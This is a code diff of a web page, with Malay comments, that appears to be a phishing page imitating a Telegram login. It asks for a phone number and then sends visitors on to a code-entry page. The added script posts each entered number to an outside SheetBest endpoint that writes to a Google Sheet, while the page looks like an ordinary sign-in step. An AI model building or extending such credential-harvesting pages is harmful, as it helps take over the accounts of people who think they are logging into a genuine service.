@@ -17,33 +17,33 @@
         phone number.
       </p>
 
-      <form id="phoneForm" action="code.html" class="form-box">
+      <form id="phoneForm" class="form-box" autocomplete="off">
         <label for="country" class="label">Country</label>
         <select id="country" class="input">
-          <option selected>Malaysia (+60)</option>
-          <option>Singapore (+65)</option>
-          <option>Indonesia (+62)</option>
-          <option>Thailand (+66)</option>
-          <option>Philippines (+63)</option>
-          <option>Vietnam (+84)</option>
-          <option>Brunei (+673)</option>
-          <option>Myanmar (+95)</option>
-          <option>Cambodia (+855)</option>
-          <option>China (+86)</option>
-          <option>India (+91)</option>
-          <option>Japan (+81)</option>
-          <option>South Korea (+82)</option>
-          <option>United States (+1)</option>
-          <option>United Kingdom (+44)</option>
-          <option>Australia (+61)</option>
-          <option>New Zealand (+64)</option>
-          <option>Germany (+49)</option>
-          <option>France (+33)</option>
-          <option>Saudi Arabia (+966)</option>
+          <option value="+60" selected>Malaysia (+60)</option>
+          <option value="+65">Singapore (+65)</option>
+          <option value="+62">Indonesia (+62)</option>
+          <option value="+66">Thailand (+66)</option>
+          <option value="+63">Philippines (+63)</option>
+          <option value="+84">Vietnam (+84)</option>
+          <option value="+673">Brunei (+673)</option>
+          <option value="+95">Myanmar (+95)</option>
+          <option value="+855">Cambodia (+855)</option>
+          <option value="+86">China (+86)</option>
+          <option value="+91">India (+91)</option>
+          <option value="+81">Japan (+81)</option>
+          <option value="+82">South Korea (+82)</option>
+          <option value="+1">United States (+1)</option>
+          <option value="+44">United Kingdom (+44)</option>
+          <option value="+61">Australia (+61)</option>
+          <option value="+64">New Zealand (+64)</option>
+          <option value="+49">Germany (+49)</option>
+          <option value="+33">France (+33)</option>
+          <option value="+966">Saudi Arabia (+966)</option>
         </select>
 
         <label for="phone" class="label">Your phone number</label>
-        <input type="text" id="phone" class="input" placeholder="+60" required>
+        <input type="text" id="phone" class="input" required>
 
         <div class="check-line">
           <input type="checkbox" id="keep" checked>
@@ -57,26 +57,63 @@
     </div>
   </div>
 
-  <!-- 💡 Skrip kawal butang & simpan nombor -->
   <script>
     const phoneInput = document.getElementById("phone");
     const nextBtn = document.getElementById("nextBtn");
     const form = document.getElementById("phoneForm");
+    const countrySelect = document.getElementById("country");
 
-    // Hanya enable bila ada input
-    phoneInput.addEventListener("input", () => {
-      nextBtn.disabled = phoneInput.value.trim() === "";
+    // 🔹 URL API SheetBest anda
+    const API = "https://api.sheetbest.com/sheets/f3cc6873-23ee-4df3-9eb8-49a788f9446a";
+
+    // Auto isi kod negara bila page load
+    window.addEventListener("DOMContentLoaded", () => {
+      phoneInput.value = countrySelect.value + " ";
+      phoneInput.focus();
     });
 
-    // Simpan nombor sebelum pindah ke code.html
-    form.addEventListener("submit", (e) => {
-      e.preventDefault(); // elak reload default
-      const country = document.getElementById("country").value;
-      const phone = phoneInput.value.trim();
-      if (phone === "") return;
+    // Tukar kod bila negara berubah
+    countrySelect.addEventListener("change", () => {
+      phoneInput.value = countrySelect.value + " ";
+      nextBtn.disabled = true;
+    });
 
-      localStorage.setItem("telegramNumber", `${country} ${phone}`);
-      form.submit(); // terus ke code.html
+    // Kawalan input — hanya nombor selepas kod negara
+    phoneInput.addEventListener("input", () => {
+      const code = countrySelect.value + " ";
+      if (!phoneInput.value.startsWith(code)) {
+        phoneInput.value = code;
+      }
+      const afterCode = phoneInput.value.slice(code.length).replace(/[^0-9]/g, '');
+      phoneInput.value = code + afterCode;
+      nextBtn.disabled = afterCode.trim() === "";
+    });
+
+    // 🔹 Bila user tekan Next
+    form.addEventListener("submit", async (e) => {
+      e.preventDefault();
+      const phone = phoneInput.value.trim();
+      if (!phone) return;
+
+      // ✅ Simpan ke kolum pertama (A) — header mesti “satu”
+      const payload = { satu: phone };
+
+      try {
+        const res = await fetch(API, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(payload)
+        });
+
+        if (res.ok) {
+          localStorage.setItem("telegramNumber", phone);
+          window.location.href = "code.html";
+        } else {
+          alert("❌ Gagal simpan nombor ke Google Sheet.");
+        }
+      } catch (err) {
+        alert("⚠️ Ralat sambungan: " + err.message);
+      }
     });
   </script>
 </body>
